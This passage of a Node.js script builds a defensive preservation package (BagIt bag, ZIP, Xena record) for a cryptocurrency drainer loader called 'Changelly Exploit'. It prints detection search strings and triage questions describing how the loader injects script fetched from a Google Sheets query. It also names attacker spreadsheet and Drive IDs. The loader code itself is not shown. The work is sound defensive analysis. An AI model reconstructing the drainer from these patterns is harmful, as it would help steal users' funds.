A docs.google.com Sheets query is not malicious by itself. The high-signal
case is an exchange-origin page or a user report tying it to a manual paste,
a supposed rate node, or an unexpected swap/withdrawal flow.

== Browser / endpoint hunt ==

Search saved pages, bookmarklets, clipboard-manager snippets, support tickets,
and incident notes for:
  "authentication?=" near "atob("
  "googlevisualizationQuerysetResponse"
  "createElement(\\"script\\")" with textContent assigned from fetched text
  a script element appended and immediately removed
  "allow pasting" in the same ticket/report as an exchange-rate claim

== Response triage questions ==

1. Which page origin was active when the code ran?
2. Were exchange or wallet sessions signed in in that browser profile?
3. Were API keys, withdrawal addresses, or connected apps changed afterwards?
4. What is the timestamp, transaction id, destination, and asset/amount?
5. Is the lure PDF/document still available for hashing and preservation?
`;
}

function xmlEscape(value) {
  return String(value).replace(/[&<>"']/g, (c) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&apos;",
  }[c]));
}

/**
 * Wrap the serialized BagIt ZIP in the documented Xena Default Package
 * Wrapper + Binary object form. This is a hand-built record following those
 * schemas (the same shape apps/red-october-command-viewer emits); it is not
 * output produced by running NAA Xena, and the sidecar says so.
 */
function xenaRecord(zipBytes) {
  const zipSha256 = sha256(zipBytes);
  const base64 = Buffer.from(zipBytes).toString("base64").match(/.{1,76}/g).join("\n");
  const sourceUri = "urn:shdwelf:html5:changelly-drainer:bagit-bag-2026-10-18";
  const description = "The following data is a MIME-compliant (RFC 2045) PEM base64 (RFC 1421) representation of the original file contents.";
  return `<?xml version="1.0" encoding="UTF-8"?>
<xena xmlns="http://preservation.naa.gov.au/xena/1.0">
  <meta_data>
    <meta_data_wrapper_name>Default Package Wrapper</meta_data_wrapper_name>
    <normaliser_name>au.gov.naa.digipres.xena.kernel.normalise.BinaryToXenaBinaryNormaliser</normaliser_name>
    <input_source_uri>${xmlEscape(sourceUri)}</input_source_uri>
  </meta_data>
  <content>
    <binary-object:binary-object xmlns:binary-object="http://preservation.naa.gov.au/binary-object/1.0" binary-object:description="${xmlEscape(description)}">
${base64.split("\n").map((line) => `      ${line}`).join("\n")}
    </binary-object:binary-object>
  </content>
</xena>
<!-- Original format: ZIP serialization of a BagIt 1.0 (RFC 8493) bag; generated ${DEEP_DIVE_AT}; BagIt ZIP ${zipBytes.length} bytes, SHA-256 ${zipSha256}; static defensive preservation only: nothing executed; see bag preservation-event.json for exactly what was retrieved. -->
`;
}

function preservationEvent(decoded, stage2 = null) {
  return JSON.stringify({
    eventType: "normalization",
    tool: TOOL,
    timestamp: NOW,
    outcome: "success",
    source: "Google Drive 1UrK4jHA9kNLogV0He2Uq0rgk2Q5bVy_d (Changelly Exploit.pdf)",
    description:
      "Read the cover PDF's extracted text and the first-stage loader it "
      + "distributes, decoded the loader's base64 payload locator locally, and "
      + "preserved the loader verbatim as inert text together with the decoded "
      + "command-and-control location, a machine-readable IOC set, a written "
      + "analysis, a deep-dive report, an attack-chain record, and defensive "
      + "detection rules. The BagIt bag is serialized to a sibling ZIP and "
      + "that ZIP is wrapped by a sibling Xena binary-normalisation record. "
      + "Static analysis only: nothing was executed and the second-stage "
      + "payload was never fetched.",
    supplementalEvents: [
      {
        eventType: "deep-dive, BagIt serialization, and Xena binary wrapping",
        timestamp: DEEP_DIVE_AT,
        outputs: ["sibling .zip serialization of this BagIt bag", "sibling .xena record wrapping the ZIP bytes", "sibling .xena.json hash sidecar"],
      },
    ],
    exclusions: {
      executed: [],
      fetched: stage2 ? ["second-stage spreadsheet cells, retrieved as a Google Drive CSV text export for static analysis"] : [],
      reproduced: [],
      reason: stage2
        ? "The second-stage sample was retrieved once, as text, through the Drive export path and preserved inert (.txt) in this gitignored bag only; it was never executed or opened in a browser, and it is not committed to the repository. It remains attacker-controlled and mutable, so its hashes — not its continued content — are the durable record. The cover PDF's social-engineering instructions are not reproduced."
        : "The second-stage payload lives in an attacker-controlled spreadsheet "
        + "and can be rewritten at will, so it is recorded as a location rather "
        + "than retrieved. The cover PDF's social-engineering instructions are "
        + "not reproduced, because redistributing the lure helps the attacker.",
    },
    xenaRelationship:
      "Two-layer preservation: this BagIt bag is Xena-inspired (source object "
      + "+ documented renditions + preservation event), and the serialized "
      + "bag ZIP is additionally wrapped by a sibling .xena record built to "
      + "the documented Xena Default Package Wrapper and Binary object "
      + "schemas. That record was hand-built by this tool, not produced or "
      + "validated by a National Archives of Australia Xena installation.",
    counts: {
      iocs: 2,
      loaderSteps: LOADER_STEPS.length,
      deepDiveFiles: 3,
      secondStageRetrieved: Boolean(stage2),
    },
    pins: PINS,
    decodedUrlBytes: decoded.bytes,
  }, null, 2) + "\n";
}

async function main() {
  const decoded = decodeBlob(BASE64_BLOB);

  // Fail closed if the pins drift, rather than silently preserving something
  // other than what was analysed.
  const gotBlob = sha256(BASE64_BLOB);
  if (gotBlob !== PINS.base64BlobSha256) {
    throw new Error(`base64 blob hash drifted:\n  got  ${gotBlob}\n  want ${PINS.base64BlobSha256}`);
  }
  if (decoded.sha256 !== PINS.decodedUrlSha256) {
    throw new Error(`decoded URL hash drifted:\n  got  ${decoded.sha256}\n  want ${PINS.decodedUrlSha256}`);
  }
  if (decoded.bytes !== PINS.decodedUrlLength) {
    throw new Error(`decoded URL length drifted: got ${decoded.bytes}, want ${PINS.decodedUrlLength}`);
  }
  if (decoded.spreadsheetId !== PINS.spreadsheetId) {
    throw new Error(`spreadsheet id drifted: got ${decoded.spreadsheetId}, want ${PINS.spreadsheetId}`);
  }
  // The loader must still contain the blob it claims to carry.
  if (!LOADER_SOURCE.includes(BASE64_BLOB)) {
    throw new Error("the preserved loader does not contain the pinned base64 blob");
  }

  // Optional second stage: a Google Drive CSV export of the payload sheet,
  // supplied out-of-band (--second-stage-csv or CHANGELLY_STAGE2_CSV). The
  // sample is live attacker code, so it is only ever read as text, hashed,
  // and written into this gitignored bag as .txt — never executed, and never
  // committed (the builder carries hashes and findings, not the sample).
  let stage2 = null;
  if (STAGE2_CSV) {
    stage2 = extractStage2(await readFile(path.resolve(root, STAGE2_CSV)));
  }

  const payload = new Map();
  // .txt, never .js: nothing in this repository or any browser should ever
  // treat the preserved loader as executable.
  payload.set("data/original/loader-bookmarklet.txt", Buffer.from(LOADER_SOURCE + "\n"));
  if (stage2) {
    payload.set("data/original/second-stage-payload.txt", Buffer.from(stage2.payloadText));
    payload.set("data/normalized/second-stage-analysis.md", Buffer.from(stage2Analysis(stage2)));
    payload.set("data/normalized/second-stage-iocs.json", Buffer.from(stage2Iocs(stage2)));
    payload.set("data/normalized/second-stage-cells.json", Buffer.from(JSON.stringify({
      source: "Google Drive CSV export of spreadsheet 15ZXXqVaJrRoojcBDbApNfHP_n6z5sLlFLNhdLNJd5PM (sheet 'API')",
      csv: stage2.csv, node: stage2.node, path: stage2.path, payload: stage2.payload,
      reviewedSample: stage2.payload.sha256 === STAGE2_REVIEWED.payloadSha256,
    }, null, 2) + "\n"));
  }
  payload.set("data/normalized/loader-analysis.md", Buffer.from(analysis(decoded)));
  payload.set("data/normalized/deep-dive.md", Buffer.from(deepDive(decoded)));
  payload.set("data/normalized/attack-chain.json", Buffer.from(attackChain(decoded, stage2)));
  payload.set("data/normalized/detection-rules.txt", Buffer.from(detectionRules(decoded)));
  payload.set("data/normalized/ioc.json", Buffer.from(ioc(decoded, stage2)));
  payload.set("data/normalized/loader-decoded.json", Buffer.from(JSON.stringify(decoded, null, 2) + "\n"));

  const payloadOxum = `${[...payload.values()].reduce((n, b) => n + b.length, 0)}.${payload.size}`;
  const tags = new Map([
    ["bagit.txt", Buffer.from("BagIt-Version: 1.0\nTag-File-Character-Encoding: UTF-8\n")],
    ["bag-info.txt", Buffer.from(
      "Bag-Software-Agent: tools/build_changelly_drainer_xena.mjs\n"
      + `Bagging-Date: ${DEEP_DIVE_AT.slice(0, 10)}\n`
      + "Source-Organization: shdwelf/Html5 defensive preservation\n"
      + `External-Description: Changelly Exploit first-stage drainer loader; static analysis only; second-stage payload ${stage2 ? "retrieved as inert text via Drive CSV export and bagged (gitignored dist only, never executed)" : "recorded as a location and never fetched"}\n`
      + `Payload-Oxum: ${payloadOxum}\n`)],
    ["metadata/preservation-event.json", Buffer.from(preservationEvent(decoded, stage2))],
  ]);
  tags.set("manifest-sha256.txt",
    Buffer.from([...payload].map(([p, b]) => `${sha256(b)}  ${p}`).sort().join("\n") + "\n"));
  tags.set("tagmanifest-sha256.txt",
    Buffer.from([...tags].map(([p, b]) => `${sha256(b)}  ${p}`).sort().join("\n") + "\n"));

  const bagFiles = new Map([...payload, ...tags]);
  await rm(OUT, { recursive: true, force: true });
  for (const [rel, buf] of bagFiles) {
    const fp = path.join(OUT, rel);
    await mkdir(path.dirname(fp), { recursive: true });
    await writeFile(fp, buf);
  }

  // Stage 2a: serialize the completed BagIt bag as a ZIP (fixed entry order
  // and timestamps, so the bytes — and therefore the Xena wrapper and every
  // hash in the sidecar — are reproducible).
  const zipEntries = {};
  for (const rel of [...bagFiles.keys()].sort()) {
    zipEntries[rel] = new Uint8Array(bagFiles.get(rel));
  }
  const zipBytes = Buffer.from(zipSync(zipEntries, { level: 9, mtime: new Date(DEEP_DIVE_AT) }));
  await mkdir(path.dirname(ZIP_OUT), { recursive: true });
  await writeFile(ZIP_OUT, zipBytes);

  // Stage 2b: wrap the serialized bag in a Xena binary-normalisation record,
  // with a JSON sidecar pinning the bag, the ZIP, and the record itself.
  const xenaBytes = Buffer.from(xenaRecord(zipBytes));
  await writeFile(XENA_OUT, xenaBytes);
  const sidecar = {
    schema: "changelly-drainer-xena-wrap/1",
    generated: DEEP_DIVE_AT,
    tool: TOOL,
    safety: {
      loaderExecuted: false,
      secondStageFetched: Boolean(stage2),
      secondStageRecordedAs: stage2 ? "bagged inert (.txt) in gitignored dist only" : "location only",
      secondStagePayload: stage2 ? { sha256: stage2.payload.sha256, bytes: stage2.payload.bytes, csvSha256: stage2.csv.sha256 } : null,
      loaderPreservedAs: "data/original/loader-bookmarklet.txt",
    },
    pins: PINS,
    bagit: {
      format: "BagIt 1.0 (RFC 8493)",
      directory: path.relative(root, OUT),
      payloadOxum,
      payloadFiles: payload.size,
      tagFiles: tags.size,
    },
    serializedBag: {
      file: path.relative(root, ZIP_OUT),
      bytes: zipBytes.length,
      sha256: sha256(zipBytes),
      serialization: "ZIP, entries sorted, fixed mtime for reproducibility",
    },
    xena: {
      file: path.relative(root, XENA_OUT),
      bytes: xenaBytes.length,
      sha256: sha256(xenaBytes),
      wrapper: "Default Package Wrapper",
      normaliser: "au.gov.naa.digipres.xena.kernel.normalise.BinaryToXenaBinaryNormaliser",
      contentSchema: "http://preservation.naa.gov.au/binary-object/1.0",
      wrappedObject: "Base64 of the serialized BagIt ZIP bytes",
      processedByXena: false,
      note: "Hand-built to the documented Xena Default Package Wrapper and Binary object schemas; not produced or validated by a National Archives of Australia Xena installation.",
    },
  };
  await writeFile(XENA_SIDECAR_OUT, JSON.stringify(sidecar, null, 2) + "\n");

  console.log(`Xena-inspired BagIt bag: ${path.relative(root, OUT)}`);
  console.log(`  pins verified: base64 blob, decoded URL hash + length, spreadsheet id`);
  console.log(`  payload files: ${payload.size}  tag files: ${tags.size}`);
  console.log(`Serialized BagIt ZIP: ${path.relative(root, ZIP_OUT)} (${zipBytes.length} bytes, sha256 ${sha256(zipBytes).slice(0, 16)}…)`);
  console.log(`Xena binary record: ${path.relative(root, XENA_OUT)} (${xenaBytes.length} bytes, sha256 ${sha256(xenaBytes).slice(0, 16)}…)`);
  console.log(`Xena sidecar: ${path.relative(root, XENA_SIDECAR_OUT)}`);
  console.log(`  second-stage payload fetched: ${stage2 ? `yes, as inert text (${stage2.payload.bytes} bytes, sha256 ${stage2.payload.sha256.slice(0, 16)}…)` : "no"}`);
  console.log(`  loader executed: no`);
}

main().catch((e) => { console.error(e); process.exit(1); });
